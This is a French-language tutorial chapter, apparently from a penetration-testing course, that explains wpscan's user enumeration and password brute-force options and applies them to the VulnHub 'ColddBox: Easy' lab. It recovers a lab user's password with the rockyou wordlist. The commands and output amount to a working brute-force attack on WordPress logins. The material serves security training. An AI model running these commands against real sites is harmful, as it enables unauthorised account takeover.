# 2. WordPress Analyzer (`wpscan`)

## Utilisation

Un usage basique de `wpscan` est,
`wpscan --url https://wordpress.example.com`.

Cependant, nous voulons faire plus que cela, alors voici une liste non exhaustive des
arguments que l'on peut utiliser avec cette commande.

### Énumération

On peut utiliser l'argument `--enumerate` pour énumérer ce que l'on passe en paramètre de cet argument.

- `u` permet d'énumérer les utilisateurs sur l'instance WordPress ;
- `p` permet d'énumérer les plugins populaires sur l'instance WordPress.

```bash
# On énumère les utilisateurs de l'instance WordPress de `https://wordpress.example.com`.  
wpscan --url https://wordpress.example.com --enumerate u
```

### Obtention de mot de passe par force brute

Avec la liste des utilisateurs qu'on a eu avant lors de l'énumération (avec `--enumerate u`),
on peut effectuer une attaque brute force sur l'utilisateur en utilisant une wordlist.

```bash
wpscan --url https://wordpress.example.com --usernames admin --passwords ./ma_wordlist.txt
```

## Exemple avec un CTF

> CTF: [ColddBox: Easy, VulnHub](https://www.vulnhub.com/entry/colddbox-easy,586/)

Nous n'allons pas faire l'intégralité du CTF mais uniquement la partie où on récupère les identifiants en utilisant `wpscan` pour simplement apprendre à utiliser `wpscan` grâce à cet exemple concret.

### Solution

#### Énumération d'utilisateurs

On énumère les utilisateurs avec `wpscan --url xxx.xxx.xxx.xxx --enumerate u`.

On trouve ainsi plusieurs nom d'utilisateurs tel que `c0ldd`, `hugo` et `philip`.

#### Brute force sur les utilisateurs

On commence avec l'utilisateur `c0ldd` puisque c'est le premier et son nom d'utilisateur se démarque un peu des autres.

On utilise alors la commande pour brute force le mot de passe d'un utilisateur.
On va utiliser la wordlist `rockyou.txt` car elle contient la liste des mot de passe les plus utilisés.

```bash
wpscan --url xxx.xxx.xxx.xxx --usernames c0ldd --passwords /usr/share/wordlists/rockyou.txt
```

Après quelques secondes, on trouve une combinaison !

```console
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210

[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

On a ainsi le mot de passe de l'utilisateur `c0ldd`, qui est `9876543210` !

---

## > [3. Intercepter et modifier des requêtes avec Burp](./3-burp-suite.md)